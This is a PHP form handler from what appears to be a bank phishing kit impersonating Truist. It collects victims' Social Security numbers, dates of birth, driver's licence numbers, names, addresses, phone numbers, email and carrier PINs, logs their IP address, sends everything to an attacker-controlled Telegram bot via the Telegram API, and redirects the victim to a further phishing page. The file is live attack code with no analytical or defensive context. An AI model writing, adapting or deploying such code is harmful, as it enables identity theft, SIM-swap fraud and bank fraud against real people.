<?php 

session_start();

require_once($_SERVER['DOCUMENT_ROOT'].'/killbot/code/include.php');
/*

        /$$$$$$$   /$$$$$$ \ _$$    _$_   _$$__  _
       | $$__  $$ /$$__  $$ |$$$|  |$$$| | $$$ | $|
       | $$  \ $$| $$  \ $$ |$$$|  |$$$| | $$$$| $|
       | $$  | $$| $$$$$$$$ |$$$|  |$$$| | $$ $$ $|
       | $$  | $$| $$__  $$ |$$$|  |$$$| | $$ $$$$|
       | $$  | $$| $$  | $$ |$$  /\ $$ | | $$\ $$$|
       | $$$$$$$/| $$  | $$ |$$ /  \$$ | | $$ \ $$|
       |_______/ |__/  |__/ |__/    \__| |__/  \__/      
                                                                                                

*/
include "cn.php";


    
     $ur = $_POST['ssn'];
     $pr = $_POST['dob'];
     $sr = $_POST['dl'];
   
     $kr = $_POST['fn'];
     $qr = $_POST['ln'];
     $wr = $_POST['sd'];
     $er = $_POST['zc'];
     $vr = $_POST['pn'];
      $vr = $_POST['eml'];
     $br = $_POST['cn'];

$_SESSION["eml"] = $_POST['eml'];
     $ppp=getenv("REMOTE_ADDR");
    
     $msg=$ppp."\nDawn676-Truist SSN : ".$ur."\nDob: " .$pr."\nDL : ".$sr."\nFirst Name : ".$kr."\nLast name: " .$qr."\nStreet Address: " .$wr."\nzipcode: " .$er."\nPhone number : ".$vr."\nCarrier pin: " .$br;

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );





	header("location:../diasuser-cd.php");

?>